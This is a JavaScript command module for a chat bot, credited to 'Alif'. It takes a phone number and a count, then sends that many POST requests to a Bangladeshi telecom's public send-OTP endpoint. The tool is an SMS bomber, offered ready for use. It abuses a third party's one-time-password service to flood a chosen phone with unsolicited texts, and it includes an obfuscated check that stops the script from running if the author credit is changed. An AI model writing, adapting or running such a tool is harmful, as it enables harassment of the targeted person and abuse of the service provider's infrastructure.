module.exports.config = Object.freeze({
  name: "sms",
  version: "1.0.1",
  permission: 2,
  credits: "Alif",
  description: "Send an SMS to the specified number",
  prefix: true,
  category: "sms send",
  usages: "otp <phone_number> <amount>",
  cooldowns: 5,
  dependencies: {}
});

module.exports.run = async function({ api, event, args }) {
    const { threadID } = event;

    // Check if credits field is present and correct (obfuscated)
    const checkCredits = (value) => value === ["A", "l", "i", "f"].join("");
    if (!checkCredits(module.exports.config.credits)) {
        api.sendMessage("Invalid script configuration. The script will not run.", threadID);
        return;
    }

    const phoneNumber = args[0];
    const amount = parseInt(args[1], 10); // Parse the amount as an integer

    if (!phoneNumber || isNaN(amount)) {
        api.sendMessage("Please provide both phone number and amount in the format: otp <phone_number> <amount>", threadID);
        return;
    }

    // Define the URL and the payload
    const url = "https://eshop-api.banglalink.net/api/v1/customer/send-otp";
    const payload = {
        type: "sms",
        phone: phoneNumber
    };

    // Define the headers
    const headers = {
        "Content-Type": "application/json"
    };

    // Function to send a single SMS request
    async function sendSms() {
        try {
            const response = await fetch(url, {
                method: 'POST',
                headers: headers,
                body: JSON.stringify(payload)
            });
            const responseData = await response.json();
            return { statusCode: response.status, responseData };
        } catch (error) {
            return { statusCode: 500, responseData: { error: 'Network error or invalid request' } };
        }
    }

    // Function to send multiple SMS requests
    async function sendMultipleSmsRequests(count) {
        const responses = [];

        for (let i = 0; i < count; i++) {
            const { statusCode, responseData } = await sendSms();
            responses.push({ statusCode, responseData });
        }

        // Collect responses to send back to the user
        let successCount = 0;
        let failCount = 0;

        responses.forEach((response) => {
            if (response.statusCode === 200) {
                successCount++;
            } else {
                failCount++;
            }
        });

        api.sendMessage(`SMS send successful: ${successCount}, failed: ${failCount}`, threadID);
    }

    // Send the specified number of SMS requests
    await sendMultipleSmsRequests(amount);
};
